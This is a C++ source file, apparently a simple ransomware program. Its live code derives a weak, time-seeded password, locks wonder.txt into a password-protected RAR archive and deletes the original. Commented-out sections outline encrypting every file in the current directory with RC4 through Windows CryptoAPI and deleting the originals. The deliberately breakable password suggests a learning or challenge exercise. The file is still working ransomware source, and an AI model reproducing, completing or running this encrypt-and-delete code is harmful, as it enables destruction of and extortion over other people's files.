// ransom.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
//#include "dirent.h"

typedef unsigned char byte;

#define VULN_PASS_LEN 50

char* szPasswordable = "abcdefghijklmnopqrstuvxyz0123456789ABCDEFGHIJKLMNOPQRSTUVXYZabcd";

// Requires buffer of at least VULN_PASS_LEN characters
void GenVulnerablePassword(char* buff)
{
	for (int i = 0; i < VULN_PASS_LEN; ++i)
	{
		buff[i] = szPasswordable[rand() & 63];
	}
}
/*
byte* GetFileContents(char* szFileName, size_t& stSize)
{
	stSize = 0;
	FILE* pFile = fopen(szFileName, "r");
	
	if (!pFile)
		return 0;

	fseek(pFile, 0, SEEK_END);
	stSize = ftell(pFile);
	fseek(pFile, 0, SEEK_SET);
	byte* szOut = new byte[stSize];
	fread(szOut, 1, stSize, pFile);
	fclose(pFile);

	return szOut;
}

void OutputBuffer(char* szName, byte* pBuffer, size_t stSize)
{
	FILE* pFile = fopen(szName, "w");
	if (!pFile)
		return;

	fwrite(pBuffer, 1, stSize, pFile);
	fclose(pFile);
	return;
}
*/

int main(int argc, char** argv)
{
	time_t t = time(0);
	srand(t);
	
	//printf("%x\n", t);
	system("@echo off");

	Sleep(rand() & ((1 << 6) - 1));

	char pPassword[51];
	GenVulnerablePassword(pPassword);
	pPassword[50] = 0;

	//printf("Pass: %s\n", pPassword);
	/*
	HCRYPTPROV hProv;

	// Attempt to add a new key container.
	if (!CryptAcquireContext(
		&hProv,              // Variable to hold returned handle.
		NULL,                // Use default key container.
		MS_ENH_RSA_AES_PROV,         // Use default CSP.
		PROV_RSA_AES,       // Type of provider to acquire.
		0))    // Create new key container.
		return 1;

	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	// Obtain handle to hash object.
	if (!CryptCreateHash(
		hProv,             // Handle to CSP obtained earlier
		CALG_MD5,          // Hashing algorithm
		0,                 // Non-keyed hash
		0,                 // Should be zero
		&hHash))           // Variable to hold hash object handle 
		return 2;

	// Hash data.
	if (!CryptHashData(
		hHash,              // Handle to hash object
		(BYTE*)(pPassword), // Pointer to password
		VULN_PASS_LEN,		// Length of data
		0))                 // No special flags
		return 3;

	// Create key from specified password.
	if (!CryptDeriveKey(
		hProv,               // Handle to CSP obtained earlier.
		CALG_RC4,            // Use a stream cipher.
		hHash,               // Handle to hashed password.
		CRYPT_EXPORTABLE,    // Make key exportable.
		&hKey))              // Variable to hold handle of key.
		return 4;
		*/
	/*
	char szDirectory[MAX_PATH * 2];
	GetCurrentDirectoryA(MAX_PATH * 2, szDirectory);

	DIR *dir;
	struct dirent *ent;
	if ((dir = opendir(szDirectory)) != NULL)
	{
		while ((ent = readdir(dir)) != NULL) 
		{
			size_t stSize = 0;
			//printf("%s\n", ent->d_name);
			byte* pFileContents = GetFileContents(ent->d_name, stSize);
			if (!pFileContents)
				continue;
			DWORD dwSize = stSize;

			// Have API return us the required buffer size.
			CryptEncrypt(
				hKey,            // Key obtained earlier
				0,               // No hashing of data
				TRUE,            // Final or only buffer of data
				0,               // Must be zero
				NULL,            // No data yet, simply return size
				&dwSize,         // Size of data
				dwSize);         // Size of block

			// We now have a size for the output buffer, so create buffer.
			byte* pBuffer = new byte[dwSize];
			memcpy(pBuffer, pFileContents, stSize);

			// Now encrypt data.
			CryptEncrypt(
				hKey,            // Key obtained earlier
				0,               // No hashing of data
				TRUE,            // Final or only buffer of data
				0,               // Must be zero
				pBuffer,         // Data buffer
				&dwSize,         // Size of data
				dwSize);         // Size of block

			char name[260];
			sprintf(name, "%s.enc", ent->d_name);
			//printf("Success %s outputted\n", name);
			OutputBuffer(name, pBuffer, dwSize);
			sprintf(name, "del %s", ent->d_name);
			system(name);

			//CryptDecrypt(hKey, 0, TRUE, 0, pBuffer, &dwSize);
			//sprintf(name, "%s.dec", ent->d_name);
			//OutputBuffer(name, pBuffer, stSize);

			delete[] pBuffer;
			delete[] pFileContents;
		}
		closedir(dir);
	}
	*/
	/*
	size_t stSize = 0;
	//printf("%s\n", ent->d_name);
	byte* pFileContents = GetFileContents("wonder.txt", stSize);
	if (!pFileContents)
		return 5;
	DWORD dwSize = stSize;

	// Have API return us the required buffer size.
	CryptEncrypt(
		hKey,            // Key obtained earlier
		0,               // No hashing of data
		TRUE,            // Final or only buffer of data
		0,               // Must be zero
		NULL,            // No data yet, simply return size
		&dwSize,         // Size of data
		dwSize);         // Size of block

						 // We now have a size for the output buffer, so create buffer.
	byte* pBuffer = new byte[dwSize];
	memcpy(pBuffer, pFileContents, stSize);

	// Now encrypt data.
	CryptEncrypt(
		hKey,            // Key obtained earlier
		0,               // No hashing of data
		TRUE,            // Final or only buffer of data
		0,               // Must be zero
		pBuffer,         // Data buffer
		&dwSize,         // Size of data
		dwSize);         // Size of block
	*/
	char name[2048];
	sprintf(name, "Rar.exe a -p%s %s %s", pPassword, "wonder.rar", "wonder.txt");
	system(name);

	sprintf(name, "del %s", "wonder.txt");
	system(name);

	//CryptDecrypt(hKey, 0, TRUE, 0, pBuffer, &dwSize);
	//sprintf(name, "%s.dec", ent->d_name);
	//OutputBuffer(name, pBuffer, stSize);

	//delete[] pBuffer;
	//delete[] pFileContents;
	// Release hash object.
	//CryptDestroyHash(hHash);

	// Release key object.
	//CryptDestroyKey(hKey);

	// Release handle to container.
	//CryptReleaseContext(hProv, 0);

    return 0;
}

